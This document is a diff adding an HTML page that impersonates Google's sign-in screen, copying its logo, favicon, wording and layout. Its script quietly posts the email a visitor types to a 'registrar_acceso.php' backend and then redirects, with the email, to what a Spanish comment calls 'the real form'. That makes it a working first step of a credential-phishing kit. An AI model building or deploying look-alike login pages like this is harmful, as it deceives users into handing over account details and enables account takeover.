@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in - Google</title>
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Roboto, Arial, sans-serif;
+      background-color: #202124;
+      color: white;
+    }
+
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: #1e1e1e;
+      padding: 40px;
+      border-radius: 28px;
+      width: 450px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    .google-logo {
+      height: 40px;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0 0 8px;
+    }
+
+    p {
+      font-size: 16px;
+      margin-bottom: 30px;
+      color: #ccc;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      background-color: transparent;
+      color: white;
+      border: 1px solid #5f6368;
+      border-radius: 4px;
+      margin-bottom: 12px;
+    }
+
+    input[type="email"]::placeholder {
+      color: #aaa;
+    }
+
+    .links {
+      font-size: 14px;
+      margin-bottom: 32px;
+    }
+
+    .links a {
+      color: #8ab4f8;
+      text-decoration: none;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .create-account {
+      font-size: 14px;
+      color: #8ab4f8;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+
+    .btn {
+      background-color: #8ab4f8;
+      color: black;
+      font-weight: 500;
+      padding: 10px 24px;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #a5c9ff;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 30px;
+      color: #aaa;
+    }
+
+    .footer a {
+      color: #aaa;
+      margin: 0 10px;
+      text-decoration: none;
+    }
+
+    .language-select {
+      position: absolute;
+      bottom: 10px;
+      left: 20px;
+      color: #aaa;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" class="google-logo" alt="Google logo">
+      <h1>Sign in</h1>
+      <p>Use your Google Account</p>
+      <form id="loginForm">
+        <input type="email" id="correo" name="correo" required placeholder="Email or phone">
+        <div class="links">
+          <a href="#">Forgot email?</a>
+        </div>
+        <p style="font-size:14px; color:#ccc; margin-top:10px;">
+          Not your computer? Use a Private Window to sign in. <a href="#" style="color:#8ab4f8;">Learn more about using Guest mode</a>
+        </p>
+        <div class="actions">
+          <button type="button" class="create-account">Create account</button>
+          <button type="submit" class="btn">Next</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="language-select">
+    English (United States)
+  </div>
+
+  <div class="footer">
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const correo = document.getElementById("correo").value;
+
+      // Enviar a tu backend para registrar el acceso
+      fetch("registrar_acceso.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario: correo })
+      });
+
+      // Redirigir al formulario real
+      window.location.href = "index.html?usuario=" + encodeURIComponent(correo);
+    });
+  </script>
+</body>
+</html>
